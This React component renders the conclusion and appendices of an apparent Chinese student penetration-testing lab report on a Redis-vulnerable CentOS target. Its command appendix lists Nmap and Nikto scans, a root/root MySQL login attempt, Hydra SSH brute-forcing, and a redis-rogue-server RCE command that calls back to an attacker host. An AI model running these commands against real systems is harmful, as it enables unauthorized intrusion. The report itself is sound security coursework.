import React from 'react';

// 八、课程实训总结 + 参考文献 + 附录
export const NS08_Summary: React.FC = () => {
    return (
        <>
            <div id="ns-summary" className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h2 className="text-[18pt] font-hei mb-6 font-bold">八、课程实训总结</h2>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">8.1 项目中用到的知识点</h3>
                <ul className="list-decimal ml-12 mb-4 space-y-2">
                    <li>Nmap端口扫描与服务识别技术，包括-sV、-sC、-p-等参数的使用</li>
                    <li>Web目录爆破技术，使用Dirb工具发现隐藏文件和目录</li>
                    <li>Web漏洞扫描技术，使用Nikto检测常见Web安全问题</li>
                    <li>Redis未授权访问漏洞原理与利用方法</li>
                    <li>Redis主从复制RCE漏洞原理（CVE-2022-0543）</li>
                    <li>渗透测试方法论：信息收集→漏洞发现→漏洞利用→权限维持→报告编写</li>
                    <li>网络拓扑绘制与资产管理</li>
                    <li>分层VLAN与微隔离安全架构设计</li>
                    <li>Shell脚本和Python脚本编程</li>
                    <li>安全加固最佳实践</li>
                </ul>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">8.2 程序有待改进的地方</h3>
                <ul className="list-decimal ml-12 mb-4 space-y-2">
                    <li>自动化扫描脚本可以增加多线程支持，提高扫描效率</li>
                    <li>可以集成更多漏洞利用模块，如Metasploit框架</li>
                    <li>报告生成功能可以自动化，生成标准格式的渗透测试报告</li>
                    <li>可以增加流量抓包分析功能，使用Wireshark或tcpdump</li>
                    <li>可以增加横向移动检测和利用模块</li>
                </ul>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">8.3 收获与建议</h3>
                <p className="mb-4 indent-8 text-justify">
                    通过本次企业内网纵深渗透实践，我深入理解了网络安全攻防的完整流程，掌握了Kali Linux常用渗透测试工具的使用方法。
                    同时也认识到网络安全的重要性——一个小小的配置疏忽（如Redis未设置密码）就可能导致严重的安全问题。
                </p>
                <p className="mb-4 indent-8 text-justify">
                    在实际工作中，建议采取以下安全措施：
                </p>
                <ul className="list-disc ml-12 mb-4 space-y-2">
                    <li>实施分层VLAN架构，隔离不同安全级别的系统</li>
                    <li>部署微隔离策略，精细化控制服务间访问</li>
                    <li>定期进行安全评估和渗透测试</li>
                    <li>及时更新系统和应用程序补丁</li>
                    <li>遵循最小权限原则配置服务</li>
                    <li>建立安全事件响应机制</li>
                    <li>加强安全意识培训</li>
                </ul>

                <h2 className="text-[16pt] font-hei mb-4 font-bold mt-8">参考文献</h2>
                <div className="space-y-2 text-sm">
                    <p>[1] 王佳亮. Kali Linux渗透测试全流程详解[M]. 人民邮电出版社, 2023.</p>
                    <p>[2] 维杰·库马尔·维卢. Kali Linux高级渗透测试[M]. 机械工业出版社, 2023.</p>
                    <p>[3] 网络安全技术联盟. Kali Linux渗透测试从新手到高手[M]. 清华大学出版社, 2025.</p>
                    <p>[4] 苗春雨, 曹雅斌, 尤其. 网络安全渗透测试[M]. 电子工业出版社, 2021.</p>
                    <p>[5] Nmap官方文档. https://nmap.org/docs.html</p>
                    <p>[6] Redis安全配置指南. https://redis.io/docs/management/security/</p>
                    <p>[7] OWASP Testing Guide. https://owasp.org/www-project-web-security-testing-guide/</p>
                </div>
            </div>

            <div id="ns-appendix" className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h2 className="text-[18pt] font-hei mb-6 font-bold">附录</h2>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">附录A：完整命令清单</h3>
                <div className="bg-gray-100 p-4 rounded font-mono text-xs mb-4 overflow-x-auto">
                    <pre>{`# ==================== 信息收集 ====================

# 主机发现
nmap -sn 192.168.6.0/24

# 端口扫描与服务识别
nmap -sV -sC -Pn 192.168.6.208

# 全端口扫描
nmap -p- --min-rate 5000 192.168.6.208

# 漏洞扫描
nmap --script=vuln -p22,80,3306,6379 192.168.6.208

# ==================== Web安全测试 ====================

# 目录扫描
dirb http://192.168.6.208/ /usr/share/wordlists/dirb/common.txt -S

# Nikto漏洞扫描
nikto -h http://192.168.6.208/

# ==================== 数据库测试 ====================

# MySQL连接测试
mysql -h 192.168.6.208 -u root --password=root

# Redis连接测试
redis-cli -h 192.168.6.208 ping
redis-cli -h 192.168.6.208 info server
redis-cli -h 192.168.6.208 keys '*'

# ==================== 弱口令测试 ====================

# SSH弱口令爆破
hydra -L users.txt -P pass.txt ssh://192.168.6.208 -t 4

# ==================== 漏洞利用 ====================

# Redis主从复制RCE
cd /tmp/redis-rogue-server
python3 redis-rogue-server.py --rhost 192.168.6.208 --lhost 192.168.6.210`}</pre>
                </div>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">附录B：测试环境信息</h3>
                <div className="mb-4">
                    <table className="w-full border-collapse border border-gray-400">
                        <tbody>
                            <tr>
                                <td className="border border-gray-400 p-2 bg-gray-100 font-bold w-1/3">攻击机IP</td>
                                <td className="border border-gray-400 p-2">192.168.6.210</td>
                            </tr>
                            <tr>
                                <td className="border border-gray-400 p-2 bg-gray-100 font-bold">攻击机系统</td>
                                <td className="border border-gray-400 p-2">Kali Linux 2024 (6.6.15-amd64)</td>
                            </tr>
                            <tr>
                                <td className="border border-gray-400 p-2 bg-gray-100 font-bold">目标IP</td>
                                <td className="border border-gray-400 p-2">192.168.6.208</td>
                            </tr>
                            <tr>
                                <td className="border border-gray-400 p-2 bg-gray-100 font-bold">目标系统</td>
                                <td className="border border-gray-400 p-2">CentOS 7 (3.10.0-1160.119.1.el7.x86_64)</td>
                            </tr>
                            <tr>
                                <td className="border border-gray-400 p-2 bg-gray-100 font-bold">测试时间</td>
                                <td className="border border-gray-400 p-2">2025年12月29日</td>
                            </tr>
                            <tr>
                                <td className="border border-gray-400 p-2 bg-gray-100 font-bold">测试人员</td>
                                <td className="border border-gray-400 p-2">[填写姓名]</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </>
    );
};
